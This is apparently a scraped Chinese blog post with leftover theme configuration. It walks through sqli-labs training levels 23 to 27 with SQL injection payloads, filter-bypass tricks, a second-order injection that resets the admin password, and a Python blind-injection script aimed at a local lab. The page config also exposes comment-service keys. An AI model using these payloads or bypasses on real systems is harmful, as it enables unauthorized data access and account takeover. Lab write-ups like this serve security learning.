字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p>七夕什么的，tan90°<br>","more":"</p>\n<h5 id=\"第二十三关\"><a href=\"#第二十三关\" class=\"headerlink\" title=\"第二十三关\"></a>第二十三关</h5><p>测试<br><code>id=1&#39; and &#39;1&#39;=&#39;1</code>时返回正常，测试<code>id=-1&#39; order by 1 #</code>就报错了，查看源代码可以看到我们递交的参数被过滤了–和#<br><img src=\"/img/2018-08-17/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">$</span><span class=\"bash\">id=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>];</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">reg = <span class=\"hljs-string\">\"/#/\"</span>;</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">reg1 = <span class=\"hljs-string\">\"/--/\"</span>;</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">replace = <span class=\"hljs-string\">\"\"</span>;</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">id = preg_replace(<span class=\"hljs-variable\">$reg</span>, <span class=\"hljs-variable\">$replace</span>, <span class=\"hljs-variable\">$id</span>);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">id = preg_replace(<span class=\"hljs-variable\">$reg1</span>, <span class=\"hljs-variable\">$replace</span>, <span class=\"hljs-variable\">$id</span>);</span></code></pre></p>\n<p>所以不能用注释的方法只能闭合查询语句，我们可以套用第八关的代码进行盲注查询<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>' and ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)) &gt;= '<span class=\"hljs-number\">97</span></code></pre></p>\n<p><img src=\"/img/2018-08-17/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>python脚本代码<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests\ntxt1 = <span class=\"hljs-string\">\"http://localhost/sqli-labs/Less-23/?id=1' and ascii(substr(database(),\"</span>\ntxt2 = <span class=\"hljs-string\">\",1)) &gt;= '\"</span>\ntxt3 = <span class=\"hljs-string\">\",1)) = '\"</span>\npayload1 = <span class=\"hljs-number\">1</span> \npayload2 = <span class=\"hljs-number\">97</span>\ntxt4 = <span class=\"hljs-string\">'Your Login name'</span>\nnum11 = <span class=\"hljs-number\">97</span>\nnum12 = <span class=\"hljs-number\">65</span>\nnum13 = <span class=\"hljs-number\">48</span>\ncode = <span class=\"hljs-string\">''</span>\nnum1 = <span class=\"hljs-number\">0</span>\nnum2 = <span class=\"hljs-number\">0</span>\nnum3 = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">9</span>):\n\turl = txt1+str(i)+txt2+str(num11)\n\treq = requests.get(url = url)\n\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\tnum1 = <span class=\"hljs-number\">1</span>\n\n\turl = txt1+str(i)+txt2+str(num12)\n\treq = requests.get(url = url)\n\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\tnum2 = <span class=\"hljs-number\">1</span>\n\n\turl = txt1+str(i)+txt2+str(num13)\n\treq = requests.get(url = url)\n\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\tnum3 = <span class=\"hljs-number\">1</span>\n\n\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">1</span>):\n\t\tnum = <span class=\"hljs-number\">97</span>\n\t\tnum += <span class=\"hljs-number\">13</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\tnum += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">7</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\tnum += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext != txt4):\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4) <span class=\"hljs-keyword\">and</span> ((num == <span class=\"hljs-number\">106</span>) <span class=\"hljs-keyword\">or</span> (num == <span class=\"hljs-number\">119</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">4</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">3</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num2 == <span class=\"hljs-number\">1</span>):\n\t\tnum = <span class=\"hljs-number\">65</span>\n\t\tnum += <span class=\"hljs-number\">13</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\tnum += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">7</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\tnum += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext != txt4):\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4) <span class=\"hljs-keyword\">and</span> ((num == <span class=\"hljs-number\">74</span>) <span class=\"hljs-keyword\">or</span> (num == <span class=\"hljs-number\">87</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">4</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">3</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num2 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num3 == <span class=\"hljs-number\">1</span>):\n\t\tnum =<span class=\"hljs-number\">48</span>\n\t\tnum += <span class=\"hljs-number\">5</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">5</span>\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span></code></pre></p>\n<p><img src=\"/img/2018-08-17/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"></p>\n<h5 id=\"第二十四关\"><a href=\"#第二十四关\" class=\"headerlink\" title=\"第二十四关\"></a>第二十四关</h5><p>这道题目考的是二次注入，可以理解为第一滴构造可以注入的条件，第二次才实施注入<br>从源代码上看login.php、login_create.php都被做了过滤<br><pre><code class=\"hljs undefined\">//login.php\n<span class=\"hljs-meta\">$</span><span class=\"bash\">username = mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">\"login_user\"</span>]);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">password = mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">\"login_password\"</span>]);</span>\n\n//login_create.php\n<span class=\"hljs-meta\">$</span><span class=\"bash\">username=  mysql_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'username'</span>]) ;</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">pass= mysql_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'password'</span>]);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">re_pass= mysql_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'re_password'</span>]);</span></code></pre></p>\n<p>mysql_real_escape_string的作用–&gt;<a href=\"http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp\" target=\"_blank\" rel=\"noopener\">传送门</a><br>mysql_escape_string的作用–&gt;<a href=\"http://www.gimoo.net/t/1410/542e28a1e826e.html\" target=\"_blank\" rel=\"noopener\">传送门</a><br>只有在pass_change.php的username没有做过滤<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">$</span><span class=\"bash\">username= <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">\"username\"</span>];</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">curr_pass= mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'current_password'</span>]);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">pass= mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'password'</span>]);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">re_pass= mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'re_password'</span>]);</span></code></pre></p>\n<p>假设我们要攻击的用户名为admin，二次注入的方法原理为构造特殊的用户名<code>admin&#39;#</code>，在修改<code>admin&#39;#</code>的用户密码的时候会由于mysql更新语句<br><pre><code class=\"hljs undefined\">$sql = \"<span class=\"hljs-keyword\">UPDATE</span> <span class=\"hljs-keyword\">users</span> <span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">PASSWORD</span>=<span class=\"hljs-string\">'$pass'</span> <span class=\"hljs-keyword\">where</span> username=<span class=\"hljs-string\">'$username'</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">password</span>=<span class=\"hljs-string\">'$curr_pass'</span> <span class=\"hljs-string\">\";</span></code></pre></p>\n<p>变为<br><pre><code class=\"hljs undefined\">UPDATE<span class=\"hljs-built_in\"> users </span><span class=\"hljs-builtin-name\">SET</span> <span class=\"hljs-attribute\">PASSWORD</span>=<span class=\"hljs-string\">'pass'</span> where <span class=\"hljs-attribute\">username</span>=<span class=\"hljs-string\">'admin'</span>#' <span class=\"hljs-keyword\">and</span> <span class=\"hljs-attribute\">password</span>=<span class=\"hljs-string\">'pass'</span> <span class=\"hljs-string\">\";</span></code></pre></p>\n<p>这样就可以达到修改admin的密码的目的<br>第一步，构建特殊用户名，密码随意<br><img src=\"/img/2018-08-17/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>登陆后修改密码，当前密码不用填，因为已经注释掉了<br><img src=\"/img/2018-08-17/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>这样就可以修改admin的密码了<br><pre><code class=\"hljs undefined\">mysql&gt; select <span class=\"hljs-symbol\">*</span> from users;\n+----+----------+------------+\n|<span class=\"hljs-string\"> id </span>|<span class=\"hljs-string\"> username </span>|<span class=\"hljs-string\"> password   </span>|\n+----+----------+------------+\n|<span class=\"hljs-string\">  1 </span>|<span class=\"hljs-string\"> Dumb     </span>|<span class=\"hljs-string\"> Dumb       </span>|\n|<span class=\"hljs-string\">  2 </span>|<span class=\"hljs-string\"> Angelina </span>|<span class=\"hljs-string\"> I-kill-you </span>|\n|<span class=\"hljs-string\">  3 </span>|<span class=\"hljs-string\"> Dummy    </span>|<span class=\"hljs-string\"> p@ssword   </span>|\n|<span class=\"hljs-string\">  4 </span>|<span class=\"hljs-string\"> secure   </span>|<span class=\"hljs-string\"> crappy     </span>|\n|<span class=\"hljs-string\">  5 </span>|<span class=\"hljs-string\"> stupid   </span>|<span class=\"hljs-string\"> stupidity  </span>|\n|<span class=\"hljs-string\">  6 </span>|<span class=\"hljs-string\"> superman </span>|<span class=\"hljs-string\"> genious    </span>|\n|<span class=\"hljs-string\">  7 </span>|<span class=\"hljs-string\"> batman   </span>|<span class=\"hljs-string\"> mob!le     </span>|\n|<span class=\"hljs-string\">  8 </span>|<span class=\"hljs-string\"> admin    </span>|<span class=\"hljs-string\"> 123        </span>|<span class=\"hljs-string\"> \t//admin的默认密码是admin\n</span>|<span class=\"hljs-string\">  9 </span>|<span class=\"hljs-string\"> admin1   </span>|<span class=\"hljs-string\"> admin1     </span>|\n|<span class=\"hljs-string\"> 10 </span>|<span class=\"hljs-string\"> admin2   </span>|<span class=\"hljs-string\"> admin2     </span>|\n|<span class=\"hljs-string\"> 11 </span>|<span class=\"hljs-string\"> admin3   </span>|<span class=\"hljs-string\"> admin3     </span>|\n|<span class=\"hljs-string\"> 12 </span>|<span class=\"hljs-string\"> dhakkan  </span>|<span class=\"hljs-string\"> dumbo      </span>|\n|<span class=\"hljs-string\"> 14 </span>|<span class=\"hljs-string\"> admin4   </span>|<span class=\"hljs-string\"> admin4     </span>|\n|<span class=\"hljs-string\"> 17 </span>|<span class=\"hljs-string\"> admin'#  </span>|<span class=\"hljs-string\"> 123        </span>|\n+----+----------+------------+\n14 rows in set (0.00 sec)</code></pre></p>\n<h5 id=\"第二十五关\"><a href=\"#第二十五关\" class=\"headerlink\" title=\"第二十五关\"></a>第二十五关</h5><p>过滤<code>and</code>和<code>or</code><br>首先测试<code>id=1&#39;</code>报错说明存在单引号注入，测试<code>id=1&#39; and &#39;1&#39;=&#39;1</code>返回正常但不是id为1的页面，从下方的提示也可以看到and被过滤掉了<br><img src=\"/img/2018-08-17/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br>测试<code>id=1&#39; anandd &#39;1&#39;=&#39;1</code>返回正常说明and只被过滤了一次<br><img src=\"/img/2018-08-17/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>只要把and或or双写就可以绕过了<br>还有一种方法是用逻辑运算符代替，用<code>&amp;&amp;</code>代替<code>and</code>,用<code>||</code>代替<code>or</code></p>\n<h5 id=\"第二十五A关\"><a href=\"#第二十五A关\" class=\"headerlink\" title=\"第二十五A关\"></a>第二十五A关</h5><p>这一关考的是过滤了and和or的盲注，同样过滤了and和or，可以用&amp;&amp;和||代替和双写绕过<br><pre><code class=\"hljs undefined\">id=1 anandd if(<span class=\"hljs-name\">length</span>(<span class=\"hljs-name\">database</span>())&gt;8,sleep(<span class=\"hljs-number\">5</span>),sleep(<span class=\"hljs-number\">10</span>)) #</code></pre></p>\n<p>实测发现可以不用盲注直接注入<br><pre><code class=\"hljs undefined\">id=-<span class=\"hljs-number\">1</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">union</span> <span class=\"hljs-title\">select</span> 1,<span class=\"hljs-title\">database</span>(),3</span></code></pre></p>\n<h5 id=\"第二十六关\"><a href=\"#第二十六关\" class=\"headerlink\" title=\"第二十六关\"></a>第二十六关</h5><p>这关过滤了空格和注释<br><pre><code class=\"hljs undefined\">function blacklist(<span class=\"hljs-variable\">$id</span>)\n&#123;\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/or/i'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//strip</span> out OR (non <span class=\"hljs-keyword\">case</span> sensitive)\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/and/i'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out AND (non <span class=\"hljs-keyword\">case</span> sensitive)\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\/\\*]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//strip</span> out /*\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[--]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out --\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[#]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out <span class=\"hljs-comment\">#</span>\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\s]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out spaces\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\/\\\\\\\\]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t<span class=\"hljs-regexp\">//</span>Strip out slashes\n<span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$id</span>;\n&#125;</code></pre></p>\n<p>替换空格的方法有<br><pre><code class=\"hljs undefined\"><span class=\"xml\"></span><span class=\"perl\">%09 --TAB键（水平）</span><span class=\"xml\">\n</span><span class=\"perl\">%0a --新建一行</span><span class=\"xml\">\n</span><span class=\"perl\">%0c --新的一页</span><span class=\"xml\">\n</span><span class=\"perl\">%0d --<span class=\"hljs-keyword\">return</span></span><span class=\"xml\">\n</span><span class=\"perl\">%0b --TAB（垂直）</span><span class=\"xml\">\n</span><span class=\"perl\">%a0 --空格</span><span class=\"xml\"></span></code></pre></p>\n<p>最后一个会报错，在linux下可以，跟apache解析有关，测试payload为<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">-1</span>'%<span class=\"hljs-number\">09</span>anandd%<span class=\"hljs-number\">09</span>'<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<p><b style=\"font-size: 6\">然而</b><br>测试union语句竟然失败了，经过多次反复测试发现上述替换都会被过滤，<b><code>id=1&#39;anandd&#39;1&#39;=&#39;1</code></b>不加空格可以注入成功，网上找到一个盲注的方法，但还是有点缺陷<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>'anandd(ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;=<span class=\"hljs-number\">97</span>)anandd'<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<p>有待补充</p>\n<h5 id=\"第二十六A关\"><a href=\"#第二十六A关\" class=\"headerlink\" title=\"第二十六A关\"></a>第二十六A关</h5><p>这一关和上一关一样，只不过sql语句多了括号<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>')anandd(ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;=<span class=\"hljs-number\">97</span>)anandd('<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"第二十七关\"><a href=\"#第二十七关\" class=\"headerlink\" title=\"第二十七关\"></a>第二十七关</h5><p>过滤了union和select，下面是过滤代码<br><pre><code class=\"hljs undefined\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">blacklist</span><span class=\"hljs-params\">($id)</span>\n</span>&#123;\n$id= preg_replace(<span class=\"hljs-string\">'/[\\/\\*]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t<span class=\"hljs-comment\">//strip out /*</span>\n$id= preg_replace(<span class=\"hljs-string\">'/[--]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t<span class=\"hljs-comment\">//Strip out --.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/[#]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t<span class=\"hljs-comment\">//Strip out #.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/[ +]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out spaces.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/select/m'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out spaces.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/[ +]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out spaces.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/union/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out union</span>\n$id= preg_replace(<span class=\"hljs-string\">'/select/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out select</span>\n$id= preg_replace(<span class=\"hljs-string\">'/UNION/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out UNION</span>\n$id= preg_replace(<span class=\"hljs-string\">'/SELECT/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out SELECT</span>\n$id= preg_replace(<span class=\"hljs-string\">'/Union/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out Union</span>\n$id= 